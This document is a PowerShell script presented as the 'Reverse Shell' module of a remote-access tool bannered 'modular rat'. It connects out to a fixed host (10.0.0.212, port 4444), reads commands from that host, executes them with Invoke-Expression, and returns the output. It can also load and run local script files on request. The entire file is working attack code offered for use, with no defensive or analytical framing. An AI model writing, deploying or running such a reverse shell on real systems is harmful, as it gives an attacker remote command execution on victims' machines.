function title {
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host "
     _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
    | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
    | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
    |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
    " -ForegroundColor Yellow
    Write-Host "
                        Module : Reverse Shell
    " -ForegroundColor Blue
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host ""
}

function run() {
    title
    try {
        $server = "10.0.0.212"
        $client = New-Object System.Net.Sockets.TCPClient($server,4444)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        while($stream.Connected) {
            $writer.Write((Get-Location).Path + '> ')
            $writer.Flush()
        
            $cmd = $reader.ReadLine()
            if(!$cmd) { break }
        
            $output = Invoke-Expression $cmd 2>&1
            $writer.WriteLine($output)
            $writer.Flush()
        
            if($cmd -match '^run-script (.+)$') {
                $scriptPath = $matches[1]
                if(Test-Path $scriptPath -PathType Leaf) {
                    $scriptContents = Get-Content $scriptPath -Raw
                    $writer.WriteLine("`nRunning script: $scriptPath`n")
                    $writer.Flush()
        
                    $scriptOutput = Invoke-Expression $scriptContents 2>&1
                    $writer.WriteLine($scriptOutput)
                    $writer.Flush()
                }
                else {
                    $writer.WriteLine("Script not found: $scriptPath")
                    $writer.Flush()
                }
            }
        }
    }
    catch {
        Write-Host "Could not establish connection..." -ForegroundColor Red
        exit 
    }
    Write-Host "Connection established...:)" -ForegroundColor Green
}
 
run
